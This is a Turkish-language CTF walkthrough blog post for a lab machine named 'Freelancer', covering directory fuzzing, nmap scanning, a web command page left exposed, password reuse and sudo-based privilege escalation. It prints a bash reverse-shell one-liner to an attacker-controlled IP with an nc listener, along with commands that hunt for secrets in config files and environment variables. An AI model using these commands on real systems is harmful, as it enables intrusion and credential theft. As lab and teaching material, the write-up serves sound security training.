# CTF Solution: Information Disclosure and Privilege Escalation on the Machine


## Giriş ve Makine Özeti

Bu makinemiz, karmaşık exploit zincirleri yerine bilgi ifşası ve hatalı yapılandırmalara odaklanan bir CTF senaryosudur. Makinenin çözüm sürecinde spesifik bir zafiyet sömürüsüne (exploitation) ihtiyaç duyulmamış; bunun yerine titiz bir numaralandırma (enumeration) süreci yürütülmüştür. Makine, geliştirme ortamlarının canlı sisteme taşınmasının, parola tekrar kullanımının ve denetimsiz sudo yetkilerinin yaratacağı riskleri pratik bir şekilde göstermektedir.

![Scenerio-Freelancer]


## CTF’in çözümü :

## Reconnaissance:

### 1. Sorunun Çözümü
Siteyi inceliyoruz ama herhangi bir proje sayfası göremiyoruz burdan sonra sitede daha fazla vakit kaybetmeden belki alt dizinlerindedir diyerek ffuf taraması yapıyoruz.

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://williamtaylor.hv/FUZZ -e .txt,.php,.html -mc 200,301,302 -s
```

- `-w`: wordlist path
- `-u`: target URL with `FUZZ` placeholder
- `-e`: extensions to test
- `-mc`: HTTP status codes to match
- `-s`: silent mode

tarama sonucunda şu dizinler karşımıza çıkıyor.
![output-of-nmapScanning]
buradaki projects dizinine gittiğimiz de 1. sorunun cevabını bulmuş oluyoruz.


## 2. Sorunun Çözümü

bu noktadan sonra sisteme giriş yapmalıyız veri toplayarak daha fazla ilerleyemiyoruz. Bu aşamada ffuf taraması ile nmap taraması yapıp sonuçlarına göz atalım.

```bash
nmap -sV -sC -p- -T4 <Target_Url>
```

- `-sV`: scan the version
- `-sC`: use basic scripts
- `-p-`: scan all ports
- `-T4`: Aggressive mod

The relevant open services are:

```text
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
5432/tcp open  postgresql
```

nmapten 4 farklı çıktı aldık. Açık portlarda kullanılan versiyonlarda exploit var mı diye bakalım. Bu işlem de ben `Searchsploiti` tercih ettim isteyen metasploit de kullanabilir.

![search-exploits-from-version]

bu kısımı bir kenara not aldık şimdilik dursun. Burası sıradan reconnaissance kısmıydı.

Hatırlarsanız ffuf taramamızın sonucunda “`devtools`“ diye bir dizin çıkmıştı. Bu devolopersin açıkta bırakmaması gerektiği ama yanlışlıkla açıkta bıraktığı bir dizin. Hemen odağımızı buraya çevirelim. Eğer bir şey bulamazsak nmap çıktımızı yorumlarız.



## Initial Access

“devtoolsa” girdiğimiz de “command-line.php” ile karşılaşıyoruz.

whoami yazdığımızda www-data olduğumuzu gördük.

buraya komut yazmak hem zahmetli hem de arka arkaya komut yazmak konforsuz olduğu için reverse shell alalım.


```bash
nc -lvnp 4444
```
Kali de 4444 portunu dinlemeye aldık.

```bash
bash -c 'bash -i >& /dev/tcp/YOUR_TUN0_IP/4444 0>&1'
```

webde de ilgili kodu girdik bu noktadan sonra kendi CMD’imizdeyiz.


Buradan sonra işlemlere başlamadan önce yetki yükseltebilirmiyiz diye kontrol edelim.

Yetkilerimize bakmak için “`sudo -l`” yaptığımız da hata ile karşılaşıyoruz. Bize bir bilgi vermedi maalesef.

Shell elde edildikten sonra sistemdeki standart SUID dosyaları kontrol ettik.

```bash
find / -perm -u=s -type f 2>/dev/null
```

![Executable-files-with-SUID-permissions]

ancak istismar edilebilir bir dosyaya rastlamadık. Hepsi default dosyalar.


## Configuration Disclosure

Aklımıza ffuf taramasından çıkan “config.php” geliyor sitede bakamamıştık buradan bakmayı deneyelim.

```bash
cd /var/www/williamtaylor.hv
ls -la
cat config.php
```
![inside-the-config.php]

Configuration filelar kimlik bilgilerini açığa çıkarır. Bu durum `lateral movement` için başlangıç noktası haline gelir.

## Lateral Movement

bu noktada william kullanıcısına ulaşmayı denedik ve şifre istedi. Bu noktada database şifresi ve kullanıcı şifresi aynıdır diye tahmin yürütüp karşımıza çıkan şifreyi deniyoruz. Burada parola tekrar kullanımı (password reuse) zafiyetini görüyoruz. Bu William’ın sistemine sızmamıza sebep oluyor.

William olarak giriş yapabildik artık sistemde gerçek bir kullanıcıyız.

Bu noktadan sonra 2. soruda bizden istenen şeye geliyoruz, kullanıcının bilgilerini databasede araştırıyoruz.

bu noktadan sonra elimizde olan şifre ile sql e bağlandıktan sonra birkaç basit sql komutu ile ilgili tabloya ulaşıp içinden en çok harcama yapan kullanıcıya ulaşıyoruz.

![result-of-the-sql-commands]

## Git Metadata Discovery

Burada 3. sorunun çözümünü arıyoruz.

```bash
cat ~/.gitconfig
git config --global user.email
```

Bu noktada 2 farklı şekilde github e-postasına ulaşmak için yolumuz var ve burda 2 side bizi doğru cevaba götürüyor.

### 1- Global Git Yapılandırma Dosyasını Okumak
Geliştiriciler genellikle tüm projelerinde geçerli olması için Git ayarlarını global olarak yaparlar. Bu ayarlar kullanıcının ev dizinindeki (Home Directory) gizli bir dosyada tutulur: `.gitconfig`

### 2- Git Komutunun Kendisini Kullanmak
Eğer dosyayı okumak yerine doğrudan Git aracına "Senin global e-posta adresin ne?" diye sormak istersen, şu komutu kullanabilirsin:

![gitconfig-results]

## Privilege Escalation
4. sorunun çözümünü arıyoruz

Bu noktada klasörlerin içerisinde baya dolaştım. History dosyalarını okudum, sistemdeki bütün git depolarını buldum ve inceledim, environment variables de arama yaptım ama işimize yarayan bir şey çıkmadı.


```bash
find / -type d -name ".git" 2>/dev/null
env | grep -iE "key|token|git|api"
```

Baya vakit harcadıktan sonra root dizinine erişemediğimi gördüm ve bir şeylerin gizlendiğini düşündüm ki düşünmekte de haklıymışım. Bu noktada tekrar yetki yükseltmeye çalıştım.

ilk olarak williamın yetkilerine bakalım
```bash
sudo -l
```
![resultsOf-sudo-l]

(ALL : ALL) ALL gördük !!! bunun anlamı william aslında gizli bir rootmuş

```bash
sudo su
```
root olduk!!!

![inside-of-root]

başından beri şüphelendiğimiz root klasörünün altında yer alan .env i okuduğumuzda github apı keyimizi de almış oluyoruz böylelikle maceramız bitiyor.


## Conclusion

Freelancer makinesi; açık unutulan test dizinlerinin, parola tekrar kullanımının ve gereksiz verilen sudo ALL yetkisinin bir sistemi nasıl tamamen ele verdiğini gösteren pratik bir örnektir.

---
[My Linkedin](https://www.linkedin.com/in/osman-erdem-d-496489283/)

[Scenerio-Freelancer]: /blogs/img/CTF-Solution-Information-Disclosure-and-Privilege-Escalation-on-the-Machine/Scenerio-Freelancer.png
[output-of-nmapScanning]: /blogs/img/CTF-Solution-Information-Disclosure-and-Privilege-Escalation-on-the-Machine/output-of-nmapScanning.png
[search-exploits-from-version]: /blogs/img/CTF-Solution-Information-Disclosure-and-Privilege-Escalation-on-the-Machine/search-exploits-from-version.png
[Executable-files-with-SUID-permissions]: /blogs/img/CTF-Solution-Information-Disclosure-and-Privilege-Escalation-on-the-Machine/Executable-files-with-SUID-permissions.png
[inside-the-config.php]: /blogs/img/CTF-Solution-Information-Disclosure-and-Privilege-Escalation-on-the-Machine/inside-the-configPhp.png
[result-of-the-sql-commands]: /blogs/img/CTF-Solution-Information-Disclosure-and-Privilege-Escalation-on-the-Machine/result-of-the-sql-commands.png
[gitconfig-results]: /blogs/img/CTF-Solution-Information-Disclosure-and-Privilege-Escalation-on-the-Machine/gitconfig-results.png
[resultsOf-sudo-l]: /blogs/img/CTF-Solution-Information-Disclosure-and-Privilege-Escalation-on-the-Machine/resultsOf-sudo-l.png
[inside-of-root]: /blogs/img/CTF-Solution-Information-Disclosure-and-Privilege-Escalation-on-the-Machine/inside-of-root.png
